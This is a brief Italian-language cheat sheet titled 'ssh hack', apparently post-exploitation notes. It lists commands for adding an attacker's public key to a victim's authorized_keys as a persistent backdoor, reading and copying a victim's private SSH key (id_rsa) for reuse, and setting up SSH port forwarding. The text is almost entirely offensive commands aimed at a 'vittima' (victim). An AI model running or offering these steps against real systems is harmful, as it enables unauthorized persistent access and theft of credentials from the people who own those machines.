# ssh hack

## aggiungere PUB_KEY 

host:
```
ssh-keygen -t rsa
export PUBLIC_KEY=$(cat <key.pub>)
```

vittima:
```
mkdir -p /home/<USER>/.ssh
echo $PUBLIC_KEY >> /home/<USER>/.ssh/authorized_keys
```
connettersi con `ssh -i key <host>@<ip>`

## furto della PRIV_KEY

vittima (copiare negli appunti):
```
cat /<USER>/.ssh/id_rsa
```

host (incollare `./priv_key`):
```
ssh -i priv_key <IP>
```

## port forwarding

```
ssh -L <LPORT>:127.0.0.1:<RPORT> -N <HOST>@<IP>
```
